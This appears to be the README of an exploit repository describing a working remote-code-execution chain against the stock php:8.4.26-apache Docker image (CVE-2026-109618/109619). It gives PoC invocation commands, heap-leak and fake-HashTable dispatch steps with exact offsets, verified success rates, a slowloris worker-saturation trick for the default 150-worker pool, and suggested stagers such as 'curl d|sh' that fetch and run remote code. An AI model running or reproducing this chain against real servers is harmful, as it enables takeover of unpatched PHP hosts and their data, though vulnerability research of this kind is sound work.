# Stock-config full chain (CVE-2026-109618/109619)

`tools/php2shell_stock_poc.py` — a complete network-only RCE chain against
the **official `php:8.4.26-apache` image with stock configuration**
(compiled defaults or `php.ini-production`: `memory_limit=128M`,
`post_max_size=8M`, `display_errors=Off`). No gdb, no `/proc`, no ini
changes, no image rebuilds: plain HTTP in, `uid` proof out, ~6-11 s.

```sh
python3 tools/php2shell_stock_poc.py --url http://target/index.php \
    --cmd 'id>o' --fetch /o --expect uid=
```

## Chain

1. **Leak** (chunked producer): a `Transfer-Encoding: chunked` multipart
   body (no Content-Length) skips the `post_max_size` gate; a ~129 MB
   field OOMs inside `php_session_send_cookie` → `php_url_encode`,
   leaving `PS(id)` dangling with `PS(send_cookie)=1`. The consumer's
   forged window returns a **600 KB cookie decoding both bases in one
   stage** (2 MiB-aligned heap pointers → chunk base; repeated
   `zval_ptr_dtor` values → libphp base).
2. **Fire**: a recalibrated producer (66 pad fields) moves the reference
   slot to a bin-56 page; **800 x 31-byte live fake-reference carriers**
   and a forged HashTable at `chunk+0xB30D8` dispatch
   `pDestructor = zif_system` with the ≤14-byte command.

## Verified matrix (leak/fire per target, N=3 each)

| target | config | leak | fire |
|---|---|---|---|
| stock 8.4.26 (compiled defaults) | 128M/8M, de=Off | 3/3 | **3/3 uid=33** |
| stock 8.5.11 | same | 3/3 | **3/3 uid=33** |
| stock 8.5.10 | same | 2/3 (retry-4 recovers) | **2/2** |
| `php-fixed:8.5.12`, `php:8.3.36` (patched) | — | 0/3 | 0/3 (clean negatives) |

Multi-worker: retries alone do not recover (measured: 5-worker leak 6/10,
fire 0/20 — the OOM reply is HTTP/1.0 `Connection: close`, defeating
keep-alive pinning). **Bounded-pool worker saturation works**:
`tools/php2shell_worker_saturation.py` holds `MaxRequestWorkers-1`
children with slow chunked uploads — 2-child pool: full chain first
attempt, every attempt. **Full-pool mode solves the default image (MaxRequestWorkers 150)**:
`hold_full_pool()` in `tools/php2shell_worker_saturation.py` holds 149
children with slowloris chunked uploads — validated end-to-end on the
stock default pool: full chain, first attempt, uid=33.

8.3.x is structurally blocked for this chain class (measured): the older
RFC1867 parser OOMs in `php_sapi_filter`/`php_session_decode` before the
`php_url_encode` site that leaves `PS(id)` dangling — sweeps across
128M/256M and producer shapes only move between no-OOM and parse-OOM.

Same chunk-relative constants across three ASLR bases — the geometry is
an image+shape property, not a container property.

## The 1.41 MB producer (`tools/bombchain.py`)

The 129 MiB field producer is not load-bearing. It exists to make the
parser **abort mid-parse**, and a header-dense part header block does that
with three orders of magnitude less wire. `tools/bombchain.py` is the same
driver with the fill replaced at **all three producer sites**
(`Leak.rotate`, `Fire.rotate`, `Fire.producer`):

| producer | wire | result |
|---|---|---|
| stock 129 MiB field fill | 129 MiB | OOM |
| **470,000 × `x:\n` part headers** | **1,416,520 B** | **OOM (500)** |
| 400,000 × `x:\n` | 1,206,520 B | 200 (does not abort) |

Per-header cost is ~314 B of PHP heap for 3 B of wire (key `estrdup` →
bin-8, `smart_string` value page → bin-80, `zend_llist` element → bin-32);
it is the same amplifier documented for the 8.5.x class, applied to the
*trigger* rather than to the fill. 470,000 lines abort any limit ≤ 128 MB.

**Zero recalibration.** The full chain (leak both bases → fake-HashTable
dispatch → `zif_system`) runs **3/3** on `php:8.4.26-apache-amd64` at 128 MB
single-worker with **identical bases across reps** and the **stock
`PROFILE_TABLE_OFF=0xB30D8`**, `zif=0x465370`, `dtor=0x65eb60`. The fill's
size never entered the geometry: it only has to abort, and the OOM point is
set by `memory_limit`, not by the declared field size.

```sh
python3 tools/bombchain.py --url http://127.0.0.1:18501/index.php \
    --bomb-n 470000 --cmd 'id>o' --fetch /proof.php
```

### Producer-size invariance

With the stock fill, `--huge-mb 129 / 96 / 90 / 64` all resolve the **same
bases** and all fire `uid=33` (4/4 on the mirror; 90 MiB repeated 2/2). The
leak is producer-size-invariant *while the field still exceeds the OOM
point* — 64 MiB of declared field is ~128 MB of internal cost on this build,
still over the limit. Below that point the geometry does not transfer; a
192 MB or 256 MB limit does not trip at all with these shapes.

### Connection pinning (`--keepalive`)

On a multi-worker pool the producer and the consumer must reach the **same
child**. Saturating the pool and leaving one worker free (`--holders N`)
raises the odds but does not guarantee them: Apache may fork a replacement
between the producer's abort and the consumer (`AH00161: server reached
MaxRequestWorkers`), and a fresh child carries no state. Measured on a
6-worker pool with 5 of 6 held: **2/5**. A failed attempt observed after a
success was a *surviving holder* from the previous rep — placement is
probabilistic, not gated.

`--keepalive` sends the producer and the consumer on **one TCP connection**,
which Apache pins to one child — verified with a per-request pid log:

```text
producer: HTTP/1.1 200 OK (pinned connection)   -> pid 38, POST 8,511,926
consumer: HTTP/1.1 200 OK                       -> pid 38, POST 18,767
```

It is **incompatible with an aborting stage** (the abort closes the
connection), so: pin every non-aborting stage, saturate-and-retry the
aborting ones.

## Fixes applied to the driver (2026-10-25)

Three defects surfaced while adapting the driver to other builds. The first
two are fixed in `tools/php2shell_stock_poc.py`; the third is a mirroring
caveat, not a code path.

**(a) The delta band was single-signed and silently discarded good leaks.**
`DELTA_MIN/MAX = +0x1A00000..+0x1F00000` encodes "libphp maps *above* the
Zend-MM chunk" for the builds calibrated here. On `php:8.5.11-apache` the
module maps **below** the chunk (measured `module − heap = −0x3600000`), so
a valid 600 KB / 2,293-pointer leak was rejected and reported as
`implausible libphp-chunk delta`. Fixed by `--delta-min` / `--delta-max`
(defaults unchanged, negative values allowed); the leak that was being
thrown away reproduces the chain on 8.5.11 **2/2** once the band is widened.

**(b) The default image's worker count breaks the leak.** The official `php`
image runs `StartServers 5` / `MaxRequestWorkers 150`. The stock profile
assumes one worker, so the fill and the consumer land on different children
and the leak returns `cookie=32B / 0B, ptrs=0`. Normalise the mirror to
`MaxRequestWorkers 1, ServerLimit 1, StartServers 1` (2/2 immediately), or
pass `--workers <real count>` so every child is rotated fresh. This is a
substrate requirement, not a tuning knob.

**(c) Docroot drift shifts the freelist.** On a single-worker mirror the
leak depends on the *exact* allocation sequence of the request. Adding a
single extra file write to the mirror's `index.php` (a `file_put_contents`
pid log, in our case) shifted the single-worker freelist and broke the leak
with no change to the chain. Mirror the docroot byte-for-byte when
comparing runs, and re-baseline after any instrumentation that allocates
inside the request.

## Limits (honest)

- Calibrated for the current `php:8.4.26-apache` build (zif_system
  `0x465370`, zval_ptr_dtor `0x65eb60`); other builds need recalibration
  (`--offsets` accepts a libphp.so or offsets file; see `profiles/`).
- Single-worker Apache prefork for reliability (multi-worker lowers the
  per-attempt hit rate; retries recover it).
- ≤14-byte command (use a stager for anything longer: the session-file
  stager `sh</tmp/sess_X` or a short-domain `curl d|sh`).
- The worker aborts after the command executes (proof is written first).

## Attribution / lineage

- **Leak design** (chunked post_max bypass, both-bases cookie window):
  reimplemented from the design published by
  [Oracle-Security/CVEs](https://github.com/Oracle-Security/CVEs/blob/main/WordPress/PHP2Shell/exploit.py)
  — their leak reproduced here first-attempt; their *fire* did not
  (root-caused: 15-byte carrier cannot carry `val.type` — the Zend-MM
  free-list write corrupts `type_info` at R0+0x10; their table address
  was a stale copy; bin-32/40 vs bin-56 page mismatch). This repo's
  fire is our own recalibration.
- **Concurrent independent work**: [9bie](https://github.com/9bie/php2shell-bypass-aslr-exp)
  published `pure/` within minutes of ours — their A1+B1 leak stages
  reproduce exactly on 8.4.26 (verified here: 819208-byte decode, matching
  bucket counts). Note: their published repo currently omits the `de0/`
  modules their `pwn_pure.py` imports, so their full chain is not
  runnable as published; their shapes are also single-build (8.5.11 and
  8.3.35 do not respond to their A1). Cite both as concurrent.
- Amplification lineage: [Calif Research](https://calif.io/php2shell/);
  chain lineage: 9bie's original ASLR work and the leaked PoC era.

## Boundary

This demonstrates RCE on a stock-config single-worker mod_php lab
target. It does not address FPM (child death closes the A/B window —
see our Chain-E notes in this repo's reconciliation log for the FPM
class), multi-worker production reliability, or builds other than the
calibrated one.
